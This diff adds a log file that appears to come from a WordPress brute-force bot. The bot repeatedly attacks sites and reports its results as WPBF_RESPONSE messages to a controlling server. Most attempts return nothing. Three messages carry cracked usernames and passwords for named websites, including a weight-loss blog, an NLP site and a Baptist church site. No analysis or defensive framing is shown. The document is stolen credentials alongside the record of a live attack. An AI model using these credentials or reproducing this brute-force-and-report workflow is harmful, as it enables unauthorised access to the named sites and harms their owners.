@@ -1,0 +1,612 @@
+---------- PROGRAM STARTED ----------
+sending message: {
+  "id": "uh4gebhsHoBnNiBZ9DYk"
+}
+CURRENT TIME: 2015-11-20 15:43:31
+CURRENT TIME: 2015-11-20 15:44:02
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:44:33
+CURRENT TIME: 2015-11-20 15:45:04
+Child dead. Reading response: 
+Done. read: 36 bytes
+weightloss247blog.com writer writer
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [
+    {
+      "site" : "weightloss247blog.com",
+      "user" : "writer",
+      "pass" : "writer"
+    }
+  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:45:35
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:46:06
+Child dead. Reading response: 
+Done. read: 28 bytes
+dailynlp.com alice alice123
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [
+    {
+      "site" : "dailynlp.com",
+      "user" : "alice",
+      "pass" : "alice123"
+    }
+  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:46:37
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:47:08
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:47:39
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:48:10
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+CURRENT TIME: 2015-11-20 15:48:41
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+CURRENT TIME: 2015-11-20 15:49:12
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+CURRENT TIME: 2015-11-20 15:49:43
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+CURRENT TIME: 2015-11-20 15:50:14
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+CURRENT TIME: 2015-11-20 15:50:45
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:51:16
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:51:47
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:52:18
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:52:49
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:53:20
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:53:51
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:54:22
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:54:53
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:55:24
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:55:55
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:56:26
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:56:57
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:57:28
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:57:59
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:58:30
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:59:01
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 15:59:32
+Child dead. Reading response: 
+Done. read: 39 bytes
+trilakesbaptist.org mwilliams password
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [
+    {
+      "site" : "trilakesbaptist.org",
+      "user" : "mwilliams",
+      "pass" : "password"
+    }
+  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:00:03
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:00:34
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:01:05
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:01:36
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:02:07
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:02:38
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:03:09
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:03:40
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:04:11
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:04:42
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:05:13
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:05:44
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:06:15
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:06:46
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:07:17
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:07:48
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:08:19
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:08:50
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:09:21
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:09:52
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:10:23
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:10:54
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+Starting brute forcing Wordpress
+CURRENT TIME: 2015-11-20 16:11:25
+Child dead. Reading response: 
+Done. read: 0 bytes
+
+sending: {
+  "type" : "WPBF_RESPONSE",
+  "linkPasses" : [  ]
+}
+
+CURRENT TIME: 2015-11-20 16:11:56
+CURRENT TIME: 2015-11-20 16:12:27
+CURRENT TIME: 2015-11-20 16:12:58
+CURRENT TIME: 2015-11-20 16:13:29
+CURRENT TIME: 2015-11-20 16:14:00
+CURRENT TIME: 2015-11-20 16:14:31
+CURRENT TIME: 2015-11-20 16:15:02
+CURRENT TIME: 2015-11-20 16:15:33
+CURRENT TIME: 2015-11-20 16:16:04
+CURRENT TIME: 2015-11-20 16:16:35
+CURRENT TIME: 2015-11-20 16:17:06
+CURRENT TIME: 2015-11-20 16:17:37
+CURRENT TIME: 2015-11-20 16:18:08
+CURRENT TIME: 2015-11-20 16:18:39
+CURRENT TIME: 2015-11-20 16:19:10
+CURRENT TIME: 2015-11-20 16:19:41
+CURRENT TIME: 2015-11-20 16:20:12
+CURRENT TIME: 2015-11-20 16:20:43
+CURRENT TIME: 2015-11-20 16:21:14
+CURRENT TIME: 2015-11-20 16:21:45
+CURRENT TIME: 2015-11-20 16:22:16
+CURRENT TIME: 2015-11-20 16:22:47
+CURRENT TIME: 2015-11-20 16:23:18
+CURRENT TIME: 2015-11-20 16:23:49
+CURRENT TIME: 2015-11-20 16:24:20
+CURRENT TIME: 2015-11-20 16:24:51
+CURRENT TIME: 2015-11-20 16:25:22
+Server disconnected. Exiting..
